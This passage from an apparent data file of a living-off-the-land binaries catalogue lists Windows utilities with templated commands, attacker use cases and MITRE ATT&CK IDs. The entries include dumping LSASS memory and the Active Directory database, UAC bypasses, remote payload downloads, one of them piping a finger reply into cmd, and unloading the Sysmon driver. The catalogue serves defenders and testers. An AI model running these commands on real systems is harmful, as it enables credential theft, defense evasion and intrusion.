    description: "Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.",
    path: ["C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0\\coregen.exe", "C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\coregen.exe"],
    commands: [{"cmd": "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name", "desc": "Loads the target .DLL in arbitrary path specified with /L.", "usecase": "Execute DLL code", "category": "Execute", "mitre": "T1055", "privileges": "User"}, {"cmd": "coregen.exe dummy_assembly_name", "desc": "Loads the coreclr.dll in the corgen.exe directory (e.g. C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0).", "usecase": "Execute DLL code", "category": "Execute", "mitre": "T1055", "privileges": "User"}, {"cmd": "coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name", "desc": "Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.", "usecase": "Execute DLL code", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}]
  },
  "createdump": {
    name: "Createdump.exe",
    description: "Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)",
    path: ["C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\<version>\\createdump.exe", "C:\\Program Files (x86)\\dotnet\\shared\\Microsoft.NETCore.App\\<version>\\createdump.exe", "C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\dotnet\\runtime\\shared\\Microsoft.NETCore.App\\6.0.0\\createdump.exe", "C:\\Program Files (x86)\\Microsoft Visual Studio\\<version>\\Community\\dotnet\\runtime\\shared\\Microsoft.NETCore.App\\6.0.0\\createdump.exe"],
    commands: [{"cmd": "createdump.exe -n -f {PATH:.dmp} {PID}", "desc": "Dump process by PID and create a minidump file. If \"-f dump.dmp\" is not specified, the file is created as '%TEMP%\\dump.%p.dmp' where %p is the PID of the target process.", "usecase": "Dump process memory contents using PID.", "category": "Dump", "mitre": "T1003", "privileges": "SYSTEM"}]
  },
  "csc": {
    name: "Csc.exe",
    description: "Binary file used by .NET Framework to compile C# code",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Csc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Csc.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\csc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe"],
    commands: [{"cmd": "csc.exe -out:{PATH:.exe} {PATH:.cs}", "desc": "Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to the specified .exe path.", "usecase": "Compile attacker code on system. Bypass defensive counter measures.", "category": "Compile", "mitre": "T1127", "privileges": "User"}, {"cmd": "csc -target:library {PATH:.cs}", "desc": "Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name.", "usecase": "Compile attacker code on system. Bypass defensive counter measures.", "category": "Compile", "mitre": "T1127", "privileges": "User"}]
  },
  "cscript": {
    name: "Cscript.exe",
    description: "Binary used to execute scripts in Windows",
    path: ["C:\\Windows\\System32\\cscript.exe", "C:\\Windows\\SysWOW64\\cscript.exe"],
    commands: [{"cmd": "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs", "desc": "Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).", "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "csi": {
    name: "csi.exe",
    description: "Command line interface included with Visual Studio.",
    path: ["c:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\MSBuild\\15.0\\Bin\\Roslyn\\csi.exe", "c:\\Program Files (x86)\\Microsoft Web Tools\\Packages\\Microsoft.Net.Compilers.X.Y.Z\\tools\\csi.exe"],
    commands: [{"cmd": "csi.exe {PATH:.cs}", "desc": "Use csi.exe to run unsigned C# code.", "usecase": "Local execution of unsigned C# code.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "customshellhost": {
    name: "CustomShellHost.exe",
    description: "A host process that is used by custom shells when using Windows in Kiosk mode.",
    path: ["C:\\Windows\\System32\\CustomShellHost.exe"],
    commands: [{"cmd": "CustomShellHost.exe", "desc": "Executes explorer.exe (with command-line argument /NoShellRegistrationCheck) if present in the current working folder.", "usecase": "Can be used to evade defensive counter-measures", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "datasvcutil": {
    name: "DataSvcUtil.exe",
    description: "DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.",
    path: ["C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\DataSvcUtil.exe"],
    commands: [{"cmd": "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}", "desc": "Upload file, credentials or data exfiltration in general", "usecase": "Upload file", "category": "Upload", "mitre": "T1567", "privileges": "User"}]
  },
  "defaultpack": {
    name: "DefaultPack.EXE",
    description: "This binary can be downloaded along side multiple software downloads on the Microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.",
    path: ["C:\\Program Files (x86)\\Microsoft\\DefaultPack\\DefaultPack.exe"],
    commands: [{"cmd": "DefaultPack.EXE /C:\"{CMD}\"", "desc": "Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.", "usecase": "Can be used to execute stagers, binaries, and other malicious commands.", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "desktopimgdownldr": {
    name: "Desktopimgdownldr.exe",
    description: "Windows binary used to configure lockscreen/desktop image",
    path: ["c:\\windows\\system32\\desktopimgdownldr.exe"],
    commands: [{"cmd": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr", "desc": "Downloads the file and sets it as the computer's lockscreen", "usecase": "Download arbitrary files from a web server", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "devicecredentialdeployment": {
    name: "DeviceCredentialDeployment.exe",
    description: "Device Credential Deployment",
    path: ["C:\\Windows\\System32\\DeviceCredentialDeployment.exe"],
    commands: [{"cmd": "DeviceCredentialDeployment", "desc": "Grab the console window handle and set it to hidden", "usecase": "Can be used to stealthily run a console application (e.g. cmd.exe) in the background", "category": "Conceal", "mitre": "T1564", "privileges": "User"}]
  },
  "devinit": {
    name: "Devinit.exe",
    description: "Visual Studio 2019 tool",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\Common7\\Tools\\devinit\\devinit.exe", "C:\\Program Files (x86)\\Microsoft Visual Studio\\<version>\\Community\\Common7\\Tools\\devinit\\devinit.exe"],
    commands: [{"cmd": "devinit.exe run -t msi-install -i {REMOTEURL:.msi}", "desc": "Downloads an MSI file to C:\\Windows\\Installer and then installs it.", "usecase": "Executes code from a (remote) MSI file.", "category": "Execute", "mitre": "T1218.007", "privileges": "User"}]
  },
  "devtoolslauncher": {
    name: "Devtoolslauncher.exe",
    description: "Binary will execute specified binary. Part of VS/VScode installation.",
    path: ["c:\\windows\\system32\\devtoolslauncher.exe"],
    commands: [{"cmd": "devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test", "desc": "The above binary will execute other binary.", "usecase": "Execute any binary with given arguments and it will call `developertoolssvc.exe`. `developertoolssvc` is actually executing the binary.", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test", "desc": "The above binary will execute other binary.", "usecase": "Execute any binary with given arguments.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "devtunnel": {
    name: "devtunnel.exe",
    description: "Binary to enable forwarded ports on windows operating systems.",
    path: ["C:\\Users\\<username>\\AppData\\Local\\Temp\\.net\\devtunnel\\devtunnel.exe", "C:\\Users\\<username>\\AppData\\Local\\Temp\\DevTunnels\\devtunnel.exe"],
    commands: [{"cmd": "devtunnel.exe host -p 8080", "desc": "Enabling a forwarded port for locally hosted service at port 8080 to be exposed on the internet.", "usecase": "Download Files, Upload Files, Data Exfiltration", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "dfsvc": {
    name: "Dfsvc.exe",
    description: "ClickOnce engine in Windows used by .NET",
    path: ["C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Dfsvc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Dfsvc.exe", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Dfsvc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Dfsvc.exe"],
    commands: [{"cmd": "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}", "desc": "Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)", "usecase": "Use binary to bypass Application whitelisting", "category": "AWL Bypass", "mitre": "T1127.002", "privileges": "User"}]
  },
  "diantz": {
    name: "Diantz.exe",
    description: "Binary that package existing files into a cabinet (.cab) file",
    path: ["c:\\windows\\system32\\diantz.exe", "c:\\windows\\syswow64\\diantz.exe"],
    commands: [{"cmd": "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab", "desc": "Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file.", "usecase": "Hide data compressed into an Alternate Data Stream.", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}", "desc": "Download and compress a remote file and store it in a CAB file on local machine.", "usecase": "Download and compress into a cab file.", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "diantz /f {PATH:.ddf}", "desc": "Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.", "usecase": "Bypass command-line based detections", "category": "Execute", "mitre": "T1036", "privileges": "User"}]
  },
  "diskshadow": {
    name: "Diskshadow.exe",
    description: "Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).",
    path: ["C:\\Windows\\System32\\diskshadow.exe", "C:\\Windows\\SysWOW64\\diskshadow.exe"],
    commands: [{"cmd": "diskshadow.exe /s {PATH:.txt}", "desc": "Execute commands using diskshadow.exe from a prepared diskshadow script.", "usecase": "Use diskshadow to exfiltrate data from VSS such as NTDS.dit", "category": "Dump", "mitre": "T1003.003", "privileges": "User"}, {"cmd": "diskshadow> exec {PATH:.exe}", "desc": "Execute commands using diskshadow.exe to spawn child process", "usecase": "Use diskshadow to bypass defensive counter measures", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "dnscmd": {
    name: "Dnscmd.exe",
    description: "A command-line interface for managing DNS servers",
    path: ["C:\\Windows\\System32\\Dnscmd.exe", "C:\\Windows\\SysWOW64\\Dnscmd.exe"],
    commands: [{"cmd": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}", "desc": "Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.", "usecase": "Remotely inject dll to dns server", "category": "Execute", "mitre": "T1543.003", "privileges": "DNS admin"}]
  },
  "dnx": {
    name: "dnx.exe",
    description: ".NET Execution environment file included with .NET.",
    path: ["no default"],
    commands: [{"cmd": "dnx.exe {PATH_ABSOLUTE:folder}", "desc": "Execute C# code located in the specified folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies)", "usecase": "Local execution of C# project stored in consoleapp folder.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "dotnet": {
    name: "Dotnet.exe",
    description: "dotnet.exe comes with .NET Framework",
    path: ["C:\\Program Files\\dotnet\\dotnet.exe"],
    commands: [{"cmd": "dotnet.exe {PATH:.dll}", "desc": "dotnet.exe will execute any DLL even if applocker is enabled.", "usecase": "Execute code bypassing AWL", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}, {"cmd": "dotnet.exe {PATH:.dll}", "desc": "dotnet.exe will execute any DLL.", "usecase": "Execute DLL", "category": "Execute", "mitre": "T1218", "privileges": "User"}, {"cmd": "dotnet.exe fsi", "desc": "dotnet.exe will open a console which allows for the execution of arbitrary F# commands", "usecase": "Execute arbitrary F# code", "category": "Execute", "mitre": "T1059", "privileges": "User"}, {"cmd": "dotnet.exe msbuild {PATH:.csproj}", "desc": "dotnet.exe with msbuild (SDK Version) will execute unsigned code", "usecase": "Execute code bypassing AWL", "category": "AWL Bypass", "mitre": "T1218", "privileges": "User"}]
  },
  "dsdbutil": {
    name: "dsdbutil.exe",
    description: "Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.",
    path: ["C:\\Windows\\System32\\dsdbutil.exe", "C:\\Windows\\SysWOW64\\dsdbutil.exe"],
    commands: [{"cmd": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\"", "desc": "dsdbutil supports VSS snapshot creation", "usecase": "Snapshoting of Active Directory NTDS.dit database", "category": "Dump", "mitre": "T1003.003", "privileges": "Administrator"}, {"cmd": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"mount {GUID}\" \"quit\" \"quit\"", "desc": "Mounting the snapshot with its GUID", "usecase": "Mounting the snapshot to access the ntds.dit with `copy c:\\<Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`", "category": "Dump", "mitre": "T1003.003", "privileges": "Administrator"}, {"cmd": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"delete {GUID}\" \"quit\" \"quit\"", "desc": "Deletes the mount of the snapshot", "usecase": "Deletes the snapshot", "category": "Dump", "mitre": "T1003.003", "privileges": "Administrator"}, {"cmd": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"list all\" \"mount 1\" \"quit\" \"quit\"", "desc": "Mounting with snapshot identifier", "usecase": "Mounting the snapshot identifier 1 and accessing it with `copy c:\\<Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`", "category": "Dump", "mitre": "T1003.003", "privileges": "Administrator"}, {"cmd": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\"", "desc": "Deletes the mount of the snapshot", "usecase": "deletes the snapshot", "category": "Dump", "mitre": "T1003.003", "privileges": "Administrator"}]
  },
  "dtutil": {
    name: "dtutil.exe",
    description: "Microsoft command line utility used to manage SQL Server Integration Services packages.",
    path: ["C:\\Program Files\\Microsoft SQL Server\\<version>\\DTS\\Binn\\dtutil.exe", "C:\\Program Files (x86)\\Microsoft SQL Server\\<version>\\DTS\\Binn\\dtutil.exe"],
    commands: [{"cmd": "dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}", "desc": "Copy file from source to destination", "usecase": "Use to copies the source file to the destination file", "category": "Copy", "mitre": "T1105", "privileges": "Administrator"}]
  },
  "dump64": {
    name: "Dump64.exe",
    description: "Memory dump tool that comes with Microsoft Visual Studio",
    path: ["C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\Feedback\\dump64.exe"],
    commands: [{"cmd": "dump64.exe {PID} out.dmp", "desc": "Creates a memory dump of the LSASS process.", "usecase": "Create memory dump and parse it offline to retrieve credentials.", "category": "Dump", "mitre": "T1003.001", "privileges": "Administrator"}]
  },
  "dumpminitool": {
    name: "DumpMinitool.exe",
    description: "Dump tool part Visual Studio 2022",
    path: ["C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\TestPlatform\\Extensions\\DumpMinitool.exe"],
    commands: [{"cmd": "DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full", "desc": "Creates a memory dump of the lsass process", "usecase": "Create memory dump and parse it offline", "category": "Dump", "mitre": "T1003.001", "privileges": "Administrator"}]
  },
  "dxcap": {
    name: "Dxcap.exe",
    description: "DirectX diagnostics/debugger included with Visual Studio.",
    path: ["C:\\Windows\\System32\\dxcap.exe", "C:\\Windows\\SysWOW64\\dxcap.exe"],
    commands: [{"cmd": "Dxcap.exe -c {PATH_ABSOLUTE:.exe}", "desc": "Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\\path\\to\\writable\\location.ext' as first argument.", "usecase": "Local execution of a process as a subprocess of dxcap.exe", "category": "Execute", "mitre": "T1127", "privileges": "User"}, {"cmd": "dxcap.exe -usage", "desc": "Once executed, `dxcap.exe` will execute `xperf.exe` in the same folder. Thus, if `dxcap.exe` is copied to a folder and an arbitrary executable is renamed to `xperf.exe`, `dxcap.exe` will spawn it.", "usecase": "Execute an arbitrary executable via trusted system executable.", "category": "Execute", "mitre": "T1127", "privileges": "User"}]
  },
  "ecmangen": {
    name: "ECMangen.exe",
    description: "Command-line tool for managing certificates in Microsoft Exchange Server.",
    path: ["C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\Bin\\ECMangen.exe", "C:\\Program Files (x86)\\Microsoft SDKs\\Windows\\<version>\\Bin\\x64\\ECMangen.exe", "C:\\Program Files\\Microsoft\\Exchange Server\\<version>\\Bin\\ECMangen.exe", "C:\\Program Files\\Microsoft\\Exchange Server\\Bin\\ECMangen.exe", "C:\\Program Files\\Microsoft\\Exchange Server\\ClientAccess\\Bin\\ECMangen.exe", "C:\\ExchangeServer\\Bin\\ECMangen.exe"],
    commands: [{"cmd": "ECMangen.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload and place it in INetCache", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "esentutl": {
    name: "Esentutl.exe",
    description: "Binary for working with Microsoft Joint Engine Technology (JET) database",
    path: ["C:\\Windows\\System32\\esentutl.exe", "C:\\Windows\\SysWOW64\\esentutl.exe"],
    commands: [{"cmd": "esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o", "desc": "Copies the source VBS file to the destination VBS file.", "usecase": "Copies files from A to B", "category": "Copy", "mitre": "T1105", "privileges": "User"}, {"cmd": "esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o", "desc": "Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.", "usecase": "Copy file and hide it in an alternate data stream as a defensive counter measure", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o", "desc": "Copies the source Alternate Data Stream (ADS) to the destination EXE.", "usecase": "Extract hidden file within alternate data streams", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o", "desc": "Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.", "usecase": "Copy file and hide it in an alternate data stream as a defensive counter measure", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o", "desc": "Copies the source EXE to the destination EXE file", "usecase": "Use to copy files from one unc path to another", "category": "Download", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}", "desc": "Copies a (locked) file using Volume Shadow Copy", "usecase": "Copy/extract a locked file such as the AD Database", "category": "Copy", "mitre": "T1003.003", "privileges": "Admin"}]
  },
  "eudcedit": {
    name: "Eudcedit.exe",
    description: "Private Character Editor Windows Utility",
    path: ["c:\\windows\\system32\\eudcedit.exe", "c:\\windows\\syswow64\\eudcedit.exe"],
    commands: [{"cmd": "eudcedit", "desc": "Once executed, the Private Charecter Editor will be opened - click OK, then click File -> Font Links. In the next window choose the option \"Link with Selected Fonts\" and click on Save As, then in the opened enter the command you want to execute.", "usecase": "Execute a binary or script as a high-integrity process without a UAC prompt.", "category": "UAC Bypass", "mitre": "T1548.002", "privileges": "Administrator"}]
  },
  "eventvwr": {
    name: "Eventvwr.exe",
    description: "Displays Windows Event Logs in a GUI window.",
    path: ["C:\\Windows\\System32\\eventvwr.exe", "C:\\Windows\\SysWOW64\\eventvwr.exe"],
    commands: [{"cmd": "eventvwr.exe", "desc": "During startup, eventvwr.exe checks the registry value `HKCU\\Software\\Classes\\mscfile\\shell\\open\\command` for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.", "usecase": "Execute a binary or script as a high-integrity process without a UAC prompt.", "category": "UAC Bypass", "mitre": "T1548.002", "privileges": "User"}, {"cmd": "ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c \"{CMD}\" > RecentViews & copy RecentViews %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews & eventvwr.exe", "desc": "During startup, eventvwr.exe uses .NET deserialization with `%LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews` file. This file can be created using https://github.com/pwntester/ysoserial.net", "usecase": "Execute a command to bypass security restrictions that limit the use of command-line interpreters.", "category": "UAC Bypass", "mitre": "T1548.002", "privileges": "Administrator"}]
  },
  "excel": {
    name: "Excel.exe",
    description: "Microsoft Office binary",
    path: ["C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Excel.exe", "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Excel.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office16\\Excel.exe", "C:\\Program Files\\Microsoft Office\\Office16\\Excel.exe", "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Excel.exe", "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Excel.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office15\\Excel.exe", "C:\\Program Files\\Microsoft Office\\Office15\\Excel.exe", "C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\Excel.exe", "C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\Excel.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office14\\Excel.exe", "C:\\Program Files\\Microsoft Office\\Office14\\Excel.exe", "C:\\Program Files (x86)\\Microsoft Office\\Office12\\Excel.exe", "C:\\Program Files\\Microsoft Office\\Office12\\Excel.exe", "C:\\Program Files\\Microsoft Office\\Office12\\Excel.exe"],
    commands: [{"cmd": "Excel.exe {REMOTEURL}", "desc": "Downloads payload from remote server", "usecase": "It will download a remote payload and place it in INetCache.", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "expand": {
    name: "Expand.exe",
    description: "Binary that expands one or more compressed files",
    path: ["C:\\Windows\\System32\\Expand.exe", "C:\\Windows\\SysWOW64\\Expand.exe"],
    commands: [{"cmd": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}", "desc": "Copies source file to destination.", "usecase": "Use to copies the source file to the destination file", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "expand {PATH_ABSOLUTE:.source.ext} {PATH_ABSOLUTE:.dest.ext}", "desc": "Copies source file to destination.", "usecase": "Copies files from A to B", "category": "Copy", "mitre": "T1105", "privileges": "User"}, {"cmd": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat", "desc": "Copies source file to destination Alternate Data Stream (ADS)", "usecase": "Copies files from A to B", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}]
  },
  "explorer": {
    name: "Explorer.exe",
    description: "Binary used for managing files and system components within Windows",
    path: ["C:\\Windows\\explorer.exe", "C:\\Windows\\SysWOW64\\explorer.exe"],
    commands: [{"cmd": "explorer.exe /root,\"{PATH_ABSOLUTE:.exe}\"", "desc": "Execute specified .exe with the parent process spawning from a new instance of explorer.exe", "usecase": "Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.", "category": "Execute", "mitre": "T1202", "privileges": "User"}, {"cmd": "explorer.exe {PATH_ABSOLUTE:.exe}", "desc": "Execute notepad.exe with the parent process spawning from a new instance of explorer.exe", "usecase": "Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.", "category": "Execute", "mitre": "T1202", "privileges": "User"}]
  },
  "extexport": {
    name: "Extexport.exe",
    description: "Load a DLL located in the c:\\test folder with a specific name.",
    path: ["C:\\Program Files\\Internet Explorer\\Extexport.exe", "C:\\Program Files (x86)\\Internet Explorer\\Extexport.exe"],
    commands: [{"cmd": "Extexport.exe {PATH_ABSOLUTE:folder} foo bar", "desc": "Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll.", "usecase": "Execute dll file", "category": "Execute", "mitre": "T1218", "privileges": "User"}]
  },
  "extrac32": {
    name: "Extrac32.exe",
    description: "Extract to ADS, copy or overwrite a file with Extrac32.exe",
    path: ["C:\\Windows\\System32\\extrac32.exe", "C:\\Windows\\SysWOW64\\extrac32.exe"],
    commands: [{"cmd": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe", "desc": "Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.", "usecase": "Extract data from cab file and hide it in an alternate data stream.", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe", "desc": "Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.", "usecase": "Extract data from cab file and hide it in an alternate data stream.", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}", "desc": "Copy the source file to the destination file and overwrite it.", "usecase": "Download file from UNC/WEBDav", "category": "Download", "mitre": "T1105", "privileges": "User"}, {"cmd": "extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}", "desc": "Command for copying file from one folder to another", "usecase": "Copy file", "category": "Copy", "mitre": "T1105", "privileges": "User"}]
  },
  "findstr": {
    name: "Findstr.exe",
    description: "Write to ADS, discover, or download files with Findstr.exe",
    path: ["C:\\Windows\\System32\\findstr.exe", "C:\\Windows\\SysWOW64\\findstr.exe"],
    commands: [{"cmd": "findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe", "desc": "Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.", "usecase": "Add a file to an alternate data stream to hide from defensive counter measures", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe", "desc": "Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.", "usecase": "Add a file to an alternate data stream from a webdav server to hide from defensive counter measures", "category": "ADS", "mitre": "T1564.004", "privileges": "User"}, {"cmd": "findstr /S /I cpassword \\\\sysvol\\policies\\*.xml", "desc": "Search for stored password in Group Policy files stored on SYSVOL.", "usecase": "Find credentials stored in cpassword attrbute", "category": "Credentials", "mitre": "T1552.001", "privileges": "User"}, {"cmd": "findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}", "desc": "Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.", "usecase": "Download/Copy file from webdav server", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "finger": {
    name: "Finger.exe",
    description: "Displays information about a user or users on a specified remote computer that is running the Finger service or daemon",
    path: ["c:\\windows\\system32\\finger.exe", "c:\\windows\\syswow64\\finger.exe"],
    commands: [{"cmd": "finger user@example.host.com | more +2 | cmd", "desc": "Downloads payload from remote Finger server. This example connects to \"example.host.com\" asking for user \"user\"; the result could contain malicious shellcode which is executed by the cmd process.", "usecase": "Download malicious payload", "category": "Download", "mitre": "T1105", "privileges": "User"}]
  },
  "fltmc": {
    name: "fltMC.exe",
    description: "Filter Manager Control Program used by Windows",
    path: ["C:\\Windows\\System32\\fltMC.exe"],
    commands: [{"cmd": "fltMC.exe unload SysmonDrv", "desc": "Unloads a driver used by security agents", "usecase": "Defense evasion", "category": "Tamper", "mitre": "T1562.001", "privileges": "Admin"}]
  },
  "forfiles": {
    name: "Forfiles.exe",
    description: "Selects and executes a command on a file or set of files. This command is useful for batch processing.",
    path: ["C:\\Windows\\System32\\forfiles.exe", "C:\\Windows\\SysWOW64\\forfiles.exe"],
